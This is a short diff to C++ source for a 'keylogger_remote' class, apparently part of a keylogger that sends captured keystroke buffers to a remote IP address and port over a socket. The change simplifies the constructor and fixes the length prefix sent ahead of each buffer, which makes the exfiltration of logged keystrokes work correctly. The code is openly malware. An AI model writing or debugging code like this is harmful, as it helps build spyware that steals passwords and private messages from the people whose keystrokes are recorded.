@@ -1,6 +1,6 @@
 #include "./keylogger_remote.hpp"
 
-keylogger_remote::keylogger_remote(size_t p_buffer_size, string p_ip_address, int p_port) : keylogger(p_buffer_size)
+keylogger_remote::keylogger_remote(string p_ip_address, int p_port) : keylogger()
 {
 	cout << p_ip_address << " - " << p_port << endl;
 
@@ -83,7 +83,7 @@ void keylogger_remote::store()
 {
 	size_t t_size = a_buffer->length();
 
-	send_complete(a_socket, (void**) &t_size, a_buffer->length());
+	send_complete(a_socket, (void**) &t_size, sizeof(size_t));
 
 	send_complete(a_socket, (void**) a_buffer->c_str(), a_buffer->length());
 }
